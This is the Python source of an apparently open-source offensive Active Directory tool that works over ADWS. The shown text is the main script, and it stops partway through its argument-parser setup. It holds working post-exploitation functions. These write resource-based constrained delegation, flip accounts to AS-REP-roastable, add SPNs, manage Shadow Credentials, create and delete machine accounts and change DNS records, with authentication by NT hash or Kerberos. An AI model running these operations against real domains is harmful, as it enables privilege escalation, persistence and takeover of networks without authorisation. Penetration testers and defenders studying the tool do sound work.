#!/usr/bin/env python3

import argparse
import logging
import re
import sys
from base64 import b64decode, b64encode
import base64
import string
import random
from uuid import uuid4
from typing import Optional

from impacket.examples import logger
from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE,
    ACCESS_MASK,
    ACE,
    ACL,
    LDAP_SID,
    SR_SECURITY_DESCRIPTOR,
)

from src.adws import ADWSAuthType, ADWSConnect, KerberosAuth, NTLMAuth
from src.soap_templates import NAMESPACES, LDAP_CREATE_FOR_RESOURCEFACTORY, LDAP_DELETE_FOR_RESOURCE, LDAP_PUT_FSTRING
from src import adcap

# DNS ADWS helpers
from src.ad_dns_manager_adws import (
    add_dns_record_adws,
    modify_dns_record_adws,
    remove_dns_record_adws,
    tombstone_dns_record_adws,
    resurrect_dns_record_adws,
)

# Shadow Credentials helpers
try:
    from src.shadow_credentials import (
        ShadowCredentialsADWS,
        shadow_credentials_list,
        shadow_credentials_add,
        shadow_credentials_remove,
        shadow_credentials_clear,
        shadow_credentials_info,
        print_shadow_creds_help,
        DSINTERNALS_AVAILABLE,
    )
    SHADOW_CREDS_AVAILABLE = DSINTERNALS_AVAILABLE
except ImportError:
    SHADOW_CREDS_AVAILABLE = False
    def print_shadow_creds_help():
        print("Shadow Credentials module not available. Install dsinternals: pip install dsinternals")


def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR()
    sd["Revision"] = b"\x01"
    sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772
    sd["OwnerSid"] = LDAP_SID()
    sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""
    sd["Sacl"] = b""
    acl = ACL()
    acl["AclRevision"] = 4
    acl["Sbz1"] = 0
    acl["Sbz2"] = 0
    acl.aces = []
    sd["Dacl"] = acl
    return sd


def _create_allow_ace(sid: LDAP_SID):
    nace = ACE()
    nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE
    nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE()
    acedata["Mask"] = ACCESS_MASK()
    acedata["Mask"]["Mask"] = 983551
    acedata["Sid"] = sid.getData()
    nace["Ace"] = acedata
    return nace


def getAccountDN(target: str, username: str, ip: str, domain: str, auth: ADWSAuthType):
    """Get the distinguishedName of a user or computer in AD using ADWS Pull"""
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["distinguishedname"]

    pull_et = pull_client.pull(query=get_account_query, basedn=None, attributes=attributes)

    distinguishedName_elem = None

    for tag in [".//addata:user", ".//addata:computer"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            distinguishedName_elem = item.find(
                ".//addata:distinguishedName/ad:value", namespaces=NAMESPACES
            )
            if distinguishedName_elem is not None:
                break
        if distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        raise RuntimeError(f"Unable to locate DN for target '{target}'")

    return distinguishedName_elem.text


from xml.etree import ElementTree as ET
from src.adws import ADWSConnect, ADWSError

def delete_computer(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType
) -> bool:
    """Delete an AD computer object using ADWS WS-Transfer Delete."""
    print(f"[*] Attempting to delete computer: {machine_name}")

    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    print("[*] Locating computer in AD...")
    try:
        dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
    except Exception as e:
        print(f"[-] Failed to locate machine {sam}: {e}")
        return False

    if not dn:
        print(f"[-] Could not find DN for computer {sam}")
        return False

    print(f"[+] Found DN: {dn}")

    msg_id = f"urn:uuid:{uuid4()}"
    delete_payload = LDAP_DELETE_FOR_RESOURCE.format(object_dn=dn, fqdn=ip, uuid=msg_id)

    print("[*] Connecting to ADWS Resource endpoint to delete object...")

    client = ADWSConnect(ip, domain, username, auth, "Resource")
    try:
        client._nmf.send(delete_payload)
        response = client._nmf.recv()
    except Exception as e:
        print(f"[-] Transport error when sending Delete request: {e}")
        return False

    try:
        et = client._handle_str_to_xml(response)
    except ADWSError:
        s = response if isinstance(response, str) else response.decode(errors="ignore")
        start = s.find('<')
        if start != -1:
            s = s[start:]
        try:
            root = ET.fromstring(s)
            ns = {'ad': 'http://schemas.microsoft.com/2008/1/ActiveDirectory'}
            msg_elem = root.find('.//ad:Message', namespaces=ns)
            msg = msg_elem.text.strip() if msg_elem is not None and msg_elem.text else None
            if msg:
                print(f"! AD error: {msg.splitlines()[0]}")
            else:
                print("! ADWS operation failed.")
        except Exception:
            print("! ADWS operation failed.")
        return False

    if et is None:
        print("[-] Empty or malformed DeleteResponse.")
        return False

    fault = et.find(".//{http://www.w3.org/2003/05/soap-envelope}Fault")
    if fault is not None:
        print("! ADWS operation failed (SOAP Fault present).")
        return False

    print(f"[+] Computer {sam} successfully deleted.")
    return True


def encode_unicode_pwd(password: str) -> str:
    quoted = f'"{password}"'
    pwd_utf16 = quoted.encode('utf-16-le')
    return base64.b64encode(pwd_utf16).decode()


def add_computer(
    target: str,
    machine_name: str,
    ou_dn: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
    computer_pass: str = None,
    spn_list: list = None,
) -> bool:
    """Create a computer object in AD via ADWS ResourceFactory."""
    if remove:
        raise NotImplementedError("Removal logic is not implemented.")
    
    import secrets

    if machine_name is None:
        machine_name = 'DESKTOP-' + (''.join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8)))

    print(f"[+] Using machine name: {machine_name}")

    sam = machine_name if machine_name.endswith("$") else machine_name + "$"
    cn = machine_name
    host = cn.rstrip("$")

    if ou_dn:
        container_dn = ou_dn
    else:
        domain_parts = [f"DC={p}" for p in domain.split(".") if p]
        domain_dn = ",".join(domain_parts)
        container_dn = f"CN=Computers,{domain_dn}"

    logging.info(f"Creating computer account {sam} in {container_dn} via ADWS ResourceFactory")

    import secrets

    if computer_pass is None:
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*?"
        computer_pass = ''.join(secrets.choice(alphabet) for _ in range(16))

    print(f"[+] Using computer password: {computer_pass}")

    encoded_pass = encode_unicode_pwd(computer_pass)

    default_spns = [
        f"HOST/{host}",
        f"HOST/{host}.{domain}",
        f"RestrictedKrbHost/{host}",
        f"RestrictedKrbHost/{host}.{domain}",
    ]

    spns = spn_list if spn_list else default_spns

    attrs = {
        "addata:objectClass": ["computer"],
        "ad:container-hierarchy-parent": [container_dn],
        "ad:relativeDistinguishedName": [f"CN={cn}"],
        "addata:sAMAccountName": [sam],
        "addata:userAccountControl": ["4096"],
        "addata:dnsHostName": [f"{host}.{domain}"],
        "addata:servicePrincipalName": spns,
        "addata:unicodePwd": [encoded_pass],
    }

    atav_xml = ""
    for attr_type, values in attrs.items():
        values_xml = ""
        for v in values:
            if attr_type == "addata:unicodePwd":
                values_xml += f'<ad:value xsi:type="xsd:base64Binary">{v}</ad:value>'
            else:
                values_xml += f'<ad:value xsi:type="xsd:string">{v}</ad:value>'

        atav_xml += (
            "      <AttributeTypeAndValue>\n"
            f"        <AttributeType>{attr_type}</AttributeType>\n"
            f"        <AttributeValue>\n          {values_xml}\n        </AttributeValue>\n"
            "      </AttributeTypeAndValue>\n"
        )

    msg_id = f"urn:uuid:{uuid4()}"

    addrequest_payload = LDAP_CREATE_FOR_RESOURCEFACTORY.format(
        uuid=msg_id,
        fqdn=ip,
        atav_xml=atav_xml
    )

    client = ADWSConnect(ip, domain, username, auth, "ResourceFactory")
    client._nmf.send(addrequest_payload)
    response = client._nmf.recv()

    et = client._handle_str_to_xml(response)
    if et is None:
        raise RuntimeError("AddRequest response empty or malformed.")

    logging.info("AddRequest successful. Locating newly created object...")

    dn = getAccountDN(target=sam, username=username, ip=ip, domain=domain, auth=auth)
    if not dn:
        raise RuntimeError("Failed to locate DN of the newly created computer.")

    logging.info(f"Created object DN: {dn}")

    print(f"[+] Computer {sam} successfully created in {dn}")
    return True


def set_generic_attribute(
    target_dn: str,
    attribute: str,
    values: list[str],
    operation: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
) -> None:
    """Write an arbitrary attribute on any AD object via ADWS Resource Put."""
    if ":" not in attribute:
        attribute = f"addata:{attribute}"

    put_client = ADWSConnect.put_client(ip, domain, username, auth)

    # ADWS PUT supports one Change block per request; iterate for multi-value.
    # For "replace": first call replaces (clears + sets), subsequent calls add.
    for i, val in enumerate(values):
        op = operation if (operation != "replace" or i == 0) else "add"
        ok = put_client.put(
            object_ref=target_dn,
            operation=op,
            attribute=attribute,
            data_type="string",
            value=val,
        )
        if not ok:
            logging.error("[-] ADWS PUT returned a non-empty body for value %r — possible error", val)
            return

    short_attr = attribute.split(":")[-1]
    print(f"[+] {short_attr} written successfully on {target_dn} (op={operation})")


def set_spn(
    target: str,
    value: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
):
    """Set a value in servicePrincipalName."""
    dn = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)
                                  
    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    
    put_client.put(
        object_ref=dn,
        operation="add" if not remove else "delete",
        attribute="addata:servicePrincipalName",
        data_type="string",
        value=value,
    )
        
    print(f"[+] servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!")


def set_asrep(
    target: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
):
    """Set or clear the DONT_REQ_PREAUTH flag on userAccountControl."""
    get_accounts_queries = f"(sAMAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["userAccountControl", "distinguishedName"]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    uac = None
    distinguishedName_elem = None

    for item in pull_et.findall(".//addata:user", namespaces=NAMESPACES):
        uac = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
    
    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        raise RuntimeError("Unable to locate target DN for asrep operation")
    dn = distinguishedName_elem.text

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    if not remove:
        newUac = int(uac.text) | 0x400000
    else:
        newUac = int(uac.text) & ~0x400000
    
    put_client.put(
        object_ref=dn,
        operation="replace",
        attribute="addata:userAccountControl",
        data_type="string",
        value=newUac,
    )
    
    print(f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!")


def set_rbcd(
    target: str,
    account: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    remove: bool = False,
):
    """Write or remove RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)."""
    get_accounts_queries = f"(|(sAMAccountName={target})(sAMAccountName={account}))"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = [
        "samaccountname",
        "objectsid",
        "distinguishedname",
        "msds-allowedtoactonbehalfofotheridentity",
    ]

    pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)

    target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd()
    target_dn: str = ""
    account_sid: LDAP_SID | None = None

    for item in pull_et.findall(".//addata:computer", namespaces=NAMESPACES):
        sam_name_elem = item.find(".//addata:sAMAccountName/ad:value", namespaces=NAMESPACES)
        sd_elem = item.find(".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value", namespaces=NAMESPACES)
        sid_elem = item.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
        distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)

        sam_name = sam_name_elem.text if sam_name_elem != None else ""
        sid = sid_elem.text if sid_elem != None else ""
        sd = sd_elem.text if sd_elem != None else ""
        dn = distinguishedName_elem.text if distinguishedName_elem != None else ""

        if sam_name and sid and sam_name.casefold() == account.casefold():
            account_sid = LDAP_SID(data=b64decode(sid))
        if dn and sam_name and sam_name.casefold() == target.casefold():
            target_dn = dn
            if sd:
                target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd))

    if not target_dn or not account_sid:
        logging.critical(f"Unable to find {target} or {account}.")
        raise SystemExit()

    target_sd["Dacl"].aces = [
        ace
        for ace in target_sd["Dacl"].aces
        if ace["Ace"]["Sid"].formatCanonical() != account_sid.formatCanonical()
    ]
    if not remove:
        target_sd["Dacl"].aces.append(_create_allow_ace(account_sid))

    put_client = ADWSConnect.put_client(ip, domain, username, auth)
    put_client.put(
        object_ref=target_dn,
        operation="replace",
        attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
        data_type="base64Binary",
        value=b64encode(target_sd.getData()).decode("utf-8"),
    )

    if remove and len(target_sd["Dacl"].aces) == 0:
        put_client.put(
            object_ref=target_dn,
            operation="delete",
            attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity",
            data_type="base64Binary",
            value=b64encode(target_sd.getData()).decode("utf-8"),
        )

    print(f"[+] msDS-AllowedToActOnBehalfOfIdentity {'removed' if remove else 'written'} successfully!")
    print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")


def handle_rbcd(
    rbcd_action_or_source: str,
    rbcd_source: str | None,
    rbcd_target: str | None,
    legacy_target: str | None,
    legacy_remove: bool,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
) -> None:
    """Dispatch RBCD operations using action-style or legacy source-style options."""
    action = rbcd_action_or_source.casefold()
    if action in ["add", "remove"]:
        if not rbcd_source:
            logging.critical("--rbcd-source is required when using \"--rbcd %s\"", action)
            raise SystemExit(1)
        if not rbcd_target:
            logging.critical("--rbcd-target is required when using \"--rbcd %s\"", action)
            raise SystemExit(1)

        set_rbcd(
            ip=ip,
            domain=domain,
            target=rbcd_target,
            account=rbcd_source,
            username=username,
            auth=auth,
            remove=action == "remove",
        )
        return

    if rbcd_source or rbcd_target:
        logging.critical("--rbcd must be \"add\" or \"remove\" when using --rbcd-source/--rbcd-target")
        raise SystemExit(1)

    if not legacy_target:
        logging.critical('Legacy "--rbcd SOURCE" syntax must be used with "--account TARGET"')
        raise SystemExit(1)

    set_rbcd(
        ip=ip,
        domain=domain,
        target=legacy_target,
        account=rbcd_action_or_source,
        username=username,
        auth=auth,
        remove=legacy_remove,
    )


def disable_machine_account(
    machine_name: str,
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType
) -> bool:
    """Disable a computer account."""
    print(f"[*] Attempting to disable computer: {machine_name}")

    sam = machine_name if machine_name.endswith("$") else machine_name + "$"

    get_accounts_queries = f"(sAMAccountName={sam})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)

    attributes: list = ["userAccountControl", "distinguishedName"]

    try:
        pull_et = pull_client.pull(query=get_accounts_queries, basedn=None, attributes=attributes)
    except Exception as e:
        print(f"[-] Failed LDAP pull for {sam}: {e}")
        return False

    uac_elem = None
    distinguishedName_elem = None

    for tag in [".//addata:computer", ".//addata:user"]:
        for item in pull_et.findall(tag, namespaces=NAMESPACES):
            if uac_elem is None:
                uac_elem = item.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
            if distinguishedName_elem is None:
                distinguishedName_elem = item.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
            if uac_elem is not None and distinguishedName_elem is not None:
                break
        if uac_elem is not None and distinguishedName_elem is not None:
            break

    if distinguishedName_elem is None or distinguishedName_elem.text is None:
        print(f"[-] Unable to locate DN for {sam}")
        return False

    dn = distinguishedName_elem.text

    if uac_elem is None or uac_elem.text is None:
        print(f"[-] Unable to locate userAccountControl for {sam}")
        return False

    try:
        current_uac = int(uac_elem.text)
    except Exception as e:
        print(f"[-] Failed to parse userAccountControl value: {e}")
        return False

    ACCOUNTDISABLE_FLAG = 0x2

    if (current_uac & ACCOUNTDISABLE_FLAG) != 0:
        print(f"[-] Computer {sam} is already disabled.")
        return True

    new_uac = current_uac | ACCOUNTDISABLE_FLAG

    try:
        put_client = ADWSConnect.put_client(ip, domain, username, auth)
        put_client.put(
            object_ref=dn,
            operation="replace",
            attribute="addata:userAccountControl",
            data_type="string",
            value=new_uac,
        )
    except Exception as e:
        print(f"[-] Failed to write new userAccountControl for {sam}: {e}")
        return False

    print(f"[+] Computer {sam} successfully disabled.")
    return True


def bind_adws(
    username: str,
    ip: str,
    domain: str,
    auth: ADWSAuthType,
    resource: str = "Enumeration",
) -> bool:
    """Authenticate to ADWS and complete the NMF bind for a resource endpoint."""
    print(f"[*] Attempting ADWS bind to {ip} Windows/{resource} as {domain}\\{username}")
    try:
        ADWSConnect(ip, domain, username, auth, resource)
    except Exception as e:
        print(f"[-] ADWS bind failed: {e}")
        return False

    print(f"[+] ADWS bind successful on {ip} Windows/{resource}")
    return True


_ADCAP_LABEL_COL = 29


def _snake_to_label(name: str) -> str:
    """``application_partitions`` -> ``Application Partitions``.
    Keeps canonical AD acronyms (DNS, SID, PDC, RID, NTDS, FSMO) uppercased.
    """
    acronyms = {
        "dns", "sid", "pdc", "rid", "ntds", "fsmo", "spn", "upn",
        "ipv4", "ipv6", "ldap", "ssl", "guid", "bios", "dn", "id",
        "os", "cn", "ou",
    }
    words = []
    for part in name.split("_"):
        if part.lower() in acronyms:
            words.append(part.upper())
        else:
            words.append(part.capitalize())
    return " ".join(words)


def _format_adcap_dict_soapy_style(d: dict) -> str:
    """Render an MS-ADCAP primitive result as an aligned SOAPy-style
    table: label column padded wide enough that even the longest label
    keeps a space before its value, multi-value fields with one value
    per line (subsequent lines indented), ``None`` / ``[]`` / ``""``
    collapsed to ``None``. Fields are shown in alphabetical order of
    their display label — matches SOAPy's upstream style.
    """
    items = sorted(d.items(), key=lambda kv: _snake_to_label(kv[0]))
    # Auto-size: ensure at least one space between the ":" and the value
    # even for long labels like "Foreign Security Principals Container:".
    max_label = max(
        (len(_snake_to_label(k)) + 1 for k, _ in items), default=0,
    )
    col = max(_ADCAP_LABEL_COL, max_label + 1)
    pad = " " * col
    lines: list[str] = []
    for key, value in items:
        label = _snake_to_label(key) + ":"
        head = f"{label:<{col}}"
        if isinstance(value, list):
            if not value:
                lines.append(f"{head}None")
            else:
                lines.append(f"{head}{value[0]}")
                for extra in value[1:]:
                    lines.append(f"{pad}{extra}")
        elif value is None or value == "":
            lines.append(f"{head}None")
        else:
            lines.append(f"{head}{value}")
    return "\n".join(lines)


_PASCAL_ACRONYMS = {"sid"}


def _snake_to_pascal(name: str) -> str:
    """snake_case → PascalCase, with wire-level acronyms kept uppercase.

    Matches the PascalCase keys the Soaphound.py Phase 2 parsers emit
    directly from the server wire (``DistinguishedName``, ``ObjectGuid``,
    ``SID``). Only ``sid`` is in the acronym set — ``guid`` stays
    ``Guid`` so ``object_guid`` → ``ObjectGuid`` (not ``ObjectGUID``) and
    byte-matches Soaphound.py.
    """
    parts = name.split("_")
    return "".join(
        p.upper() if p.lower() in _PASCAL_ACRONYMS else p.capitalize()
        for p in parts
    )


def _format_principal_list_powershell(principals: list[dict]) -> str:
    """Render a list of principal dicts as a PowerShell Format-List output,
    matching what RSAT's Get-AD* cmdlets print natively.

    Each principal is a block of ``Key : Value`` lines, colon-aligned to the
    longest key + 1 space. Keys are converted snake_case → PascalCase so the
    output byte-matches Soaphound.py (whose parsers emit PascalCase directly).
    Lists render as ``{a, b, c}`` (``{}`` when empty). ``None`` renders as an
    empty string on the right of the colon. Blocks are separated by one
    blank line.
    """
    if not principals:
        return ""

    out_blocks: list[str] = []
    for principal in principals:
        if not principal:
            continue
        pascal_items = sorted([(_snake_to_pascal(k), v) for k, v in principal.items()], key=lambda kv: kv[0])
        col = max(len(k) for k, _ in pascal_items)
        block_lines: list[str] = []
        for key, value in pascal_items:
            if isinstance(value, list):
                rendered = "{" + ", ".join(str(v) for v in value) + "}" if value else "{}"
            elif value is None:
                rendered = ""
            else:
                rendered = str(value)
            block_lines.append(f"{key:<{col}} : {rendered}")
        out_blocks.append("\n".join(block_lines))

    return "\n\n".join(out_blocks)


def run_cli():
    print(r"""
  ____   ___    _    ____        
 / ___| / _ \  / \  |  _ \ _   _ 
 \___ \| | | |/ _ \ | |_) | | | |
  ___) | |_| / ___ \|  __/| |_| |
 |____/ \___/_/   \_\_|    \__, |
                           |___/ 
v1.0.0
@_logangoins
github.com/jlevere
""")

    parser = argparse.ArgumentParser(
        add_help=True,
        description="Perform AD reconnaissance and post-exploitation through ADWS over SOCKS5",
    )
    parser.add_argument(
        "connection",
        action="store",
        nargs="?",
        default=None,
        help="domain/username[:password]@<targetName or address>",
    )
    parser.add_argument(
        "--debug",
        action="store_true",
        help="Turn DEBUG output ON"
    )
    parser.add_argument(
        "-ts",
        action="store_true",
        help="Adds timestamp to every logging output."
    )
    parser.add_argument(
        "-nt", "--nthash",
        action="store",
        metavar="nthash",
        help="Use an NT hash for authentication",
    )
    parser.add_argument(
        "-k",
        "--kerberos",
        action="store_true",
        help="Use Kerberos authentication from the KRB5CCNAME ccache",
    )

    # Enumeration options
    enum = parser.add_argument_group('Enumeration')
    enum.add_argument("--users", action="store_true", help="Enumerate user objects")
    enum.add_argument("--computers", action="store_true", help="Enumerate computer objects")
    enum.add_argument("--groups", action="store_true", help="Enumerate group objects")
    enum.add_argument("--constrained", action="store_true", help="Enumerate objects with msds-allowedtodelegateto")
    enum.add_argument("--unconstrained", action="store_true", help="Enumerate objects with TRUSTED_FOR_DELEGATION")
    enum.add_argument("--spns", action="store_true", help="Enumerate accounts with servicePrincipalName set")
    enum.add_argument("--asreproastable", action="store_true", help="Enumerate accounts with DONT_REQ_PREAUTH set")
    enum.add_argument("--admins", action="store_true", help="Enumerate high privilege accounts")
    enum.add_argument("--rbcds", action="store_true", help="Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set")
    enum.add_argument("-q", "--query", action="store", metavar="query", help="Raw query to execute on the target")
    enum.add_argument("-f", "--filter", action="store", metavar="attr,attr,...", help="Attributes to select, comma separated")
    enum.add_argument("-dn", "--distinguishedname", action="store", metavar="distinguishedname", help="The root object's distinguishedName for the query")
    enum.add_argument("-p", "--parse", action="store_true", help="Parse attributes to human readable format")
    enum.add_argument(
        "--start-sid",
        metavar="SID",
        help="Inclusive starting object SID for an enumeration range",
    )
    enum.add_argument(
        "--end-sid",
        metavar="SID",
        help="Inclusive ending object SID for an enumeration range",
    )
    enum.add_argument("--bind", action="store_true", help="Authenticate and bind to ADWS without running a query")
    enum.add_argument(
        "--show",
        action="store_true",
        help="Print .soapy_data in SOAPy's BOFHound-compatible LDAP format",
    )

    # Writing options
    writing = parser.add_argument_group('Writing')
    writing.add_argument("--rbcd", action="store", metavar="ACTION", help="RBCD action: add, remove")
    writing.add_argument("--rbcd-source", action="store", metavar="SOURCE", help="Source account to allow for RBCD")
    writing.add_argument("--rbcd-target", action="store", metavar="TARGET", help="Target account to modify for RBCD")
    writing.add_argument("--spn", action="store", metavar="value", help='Write servicePrincipalName value (use --remove to delete)')
    writing.add_argument("--asrep", action="store_true", help="Write DONT_REQ_PREAUTH flag (asrep roastable)")
    writing.add_argument("--account", action="store", metavar="account", help="Account to perform operations on")
    writing.add_argument("--remove", action="store_true", help="Remove attribute value based on operation")

    # Computer management
    writing.add_argument("--addcomputer", nargs='?', const='', action="store", metavar="MACHINE", help="Create a computer account in AD")
    writing.add_argument("--computer-pass", action="store", metavar="pass", help="Password for the new computer account")
    writing.add_argument("--ou", action="store", metavar="ou", help="DN of the OU where to create the computer")
    writing.add_argument("--delete-computer", action="store", metavar="MACHINE", help="Delete an existing computer account")
    writing.add_argument("--disable-account", action="store", metavar="MACHINE", help="Disable a computer account")

    # Shadow Credentials options
    writing.add_argument("--shadow-creds", action="store", metavar="ACTION",
                       choices=['list', 'add', 'remove', 'clear', 'info'],
                       help="Shadow Credentials action: list, add, remove, clear, info")
    writing.add_argument("--shadow-target", action="store", metavar="TARGET",
                       help="Target account for Shadow Credentials operation")
    writing.add_argument("--device-id", action="store", metavar="ID",
                       help="Device ID for remove/info actions")
    writing.add_argument("--cert-filename", action="store", metavar="NAME",
                       help="Filename for certificate export (add action)")
    writing.add_argument("--cert-export", action="store", metavar="TYPE",
                       choices=['PEM', 'PFX'], default='PFX',
                       help="Export type: PEM or PFX (default: PFX)")
    writing.add_argument("--cert-password", action="store", metavar="PASS",
                       help="Password for PFX file (random if not set)")

    # DNS management options
    writing.add_argument("--dns-add", action="store", metavar="FQDN", help="Add A record (FQDN). Requires --dns-ip")
    writing.add_argument("--dns-modify", action="store", metavar="FQDN", help="Modify/replace A record (FQDN). Requires --dns-ip")
    writing.add_argument("--dns-remove", action="store", metavar="FQDN", help="Remove A record (FQDN). Requires --dns-ip unless --ldapdelete")
    writing.add_argument("--dns-tombstone", action="store", metavar="FQDN", help="Tombstone a dnsNode")
    writing.add_argument("--dns-resurrect", action="store", metavar="FQDN", help="Resurrect a tombstoned dnsNode")
    writing.add_argument("--dns-ip", action="store", metavar="IP", help="IP used with dns add/modify/remove")
    writing.add_argument("--ldapdelete", action="store_true", help="Use delete on dnsNode object")
    writing.add_argument("--allow-multiple", action="store_true", help="Allow multiple A records when adding")
    writing.add_argument("--ttl", type=int, default=180, help="TTL for new A record (default 180)")
    writing.add_argument("--tcp", action="store_true", help="Use DNS over TCP when fetching SOA serial")

    # Generic attribute write
    writing.add_argument("--set-attribute", action="store_true",
        help="Write an arbitrary attribute on an AD object via ADWS Resource Put")
    writing.add_argument("--target-dn", metavar="TARGET_DN",
        help="Full DN of the object to modify (use with --set-attribute)")
    writing.add_argument("--attribute", metavar="ATTR",
        help="LDAP attribute name to modify (addata: prefix added automatically)")
    writing.add_argument("--attr-value", metavar="VALUE", action="append",
        help="Value to write (repeatable for multi-valued attributes)")
    writing.add_argument("--attr-op", choices=["add", "replace", "delete"],
        default="replace", help="LDAP operation (default: replace)")

    # MS-ADCAP options
    adcap_grp = parser.add_argument_group('MS-ADCAP')
    adcap_grp.add_argument(
        "--translate-name",
        dest="translate_name",
        action="store_true",
        help="Translate name(s) via MS-ADCAP AccountManagement/TranslateName",
    )
    adcap_grp.add_argument(
        "--name",
        dest="adcap_names",
        action="append",
        metavar="DN",
        default=[],
        help="Name to translate (repeatable, use with --translate-name)",
    )
    adcap_grp.add_argument(
        "--desired",
        dest="adcap_desired",
        action="store",
        metavar="FORMAT",
        default="CanonicalName",
        help="Desired output format for --translate-name (default: CanonicalName)",
    )
    adcap_grp.add_argument(
        "--get-forest",
        dest="get_forest",
        action="store_true",
        help="Retrieve forest topology via MS-ADCAP TopologyManagement/GetADForest",
    )
    adcap_grp.add_argument(
        "--get-domain",
        dest="get_domain",
        action="store_true",
        help="Retrieve domain object via MS-ADCAP TopologyManagement/GetADDomain",
    )
    adcap_grp.add_argument(
        "--get-dc",
        dest="get_dc",
        action="store_true",
        help="Retrieve DC object via MS-ADCAP TopologyManagement/GetADDomainController (requires --ntds-settings-dn)",
    )
    adcap_grp.add_argument(
        "--get-version",
        dest="get_version",
        action="store_true",
        help="Fingerprint the ADWS service version via MS-ADCAP TopologyManagement/GetVersion",
    )
    adcap_grp.add_argument(
        "--identity",
        dest="adcap_identity",
        action="store",
        metavar="DN",
        default=None,
        help="Optional identity (DN / NetBIOS / DNS) for --get-domain",
    )
    adcap_grp.add_argument(
        "--ntds-settings-dn",
        dest="ntds_settings_dn",
        action="append",
        metavar="DN",
        default=[],
        help="NTDS Settings DN for --get-dc (repeatable, required). Example: "
             "CN=NTDS Settings,CN=DC-01,CN=Servers,CN=Site1,CN=Sites,CN=Configuration,DC=example,DC=local",
    )
    adcap_grp.add_argument(
        "--get-group-member",
        dest="get_group_member",
        metavar="GROUP",
        default=None,
        help="MS-ADCAP AccountManagement/GetADGroupMember — direct members of GROUP "
             "(DN by default, see --principal-format)",
    )
    adcap_grp.add_argument(
        "--get-group-membership",
        dest="get_group_membership",
        metavar="PRINCIPAL",
        default=None,
        help="MS-ADCAP AccountManagement/GetADPrincipalGroupMembership — direct "
             "groups of PRINCIPAL",
    )
    adcap_grp.add_argument(
        "--get-auth-groups",
        dest="get_auth_groups",
        metavar="PRINCIPAL",
        default=None,
        help="MS-ADCAP AccountManagement/GetADPrincipalAuthorizationGroup — "
             "transitive groups of PRINCIPAL (nested resolved server-side)",
    )
    adcap_grp.add_argument(
        "--principal-format",
        dest="principal_format",
        choices=["dn", "canonical"],
        default="dn",
        help="Format of the principal/group identity for --get-group-member / "
             "--get-group-membership / --get-auth-groups (default: dn)",
    )
    adcap_grp.add_argument(
        "--partition-dn",
        dest="partition_dn",
        metavar="DN",
        default=None,
        help="NC/partition DN for --get-group-member / --get-group-membership / "
             "--get-auth-groups. Mandatory server-side (undocumented). Auto-derived "
             "from the identity's trailing DC= components when --principal-format=dn; "
             "required when --principal-format=canonical.",
    )

    wstep_grp = parser.add_argument_group('WS-Trust enrollment (MS-XCEP + MS-WSTEP)')
    wstep_grp.add_argument(
        "--list-policies-ws",
        dest="list_policies_ws",
        action="store_true",
        help="List AD CS enrollment policies via MS-XCEP GetPolicies",
    )
    wstep_grp.add_argument(
        "--enroll-ws",
        dest="enroll_ws",
        action="store_true",
        help="Request a certificate via MS-WSTEP RequestSecurityToken",
    )
    wstep_grp.add_argument(
        "--cep-url",
        dest="cep_url",
        action="store",
        metavar="URL",
        help="MS-XCEP (Policy) endpoint URL (default: derived from --ca + DC hostname)",
    )
    wstep_grp.add_argument(
        "--ces-url",
        dest="ces_url",
        action="store",
        metavar="URL",
        help="MS-WSTEP (Enrollment) endpoint URL (default: derived from --ca + DC hostname)",
    )
    wstep_grp.add_argument(
        "--ca",
        dest="wstep_ca",
        action="store",
        metavar="NAME",
        help="CA name (e.g. jjk-CA) used to build default --cep-url/--ces-url",
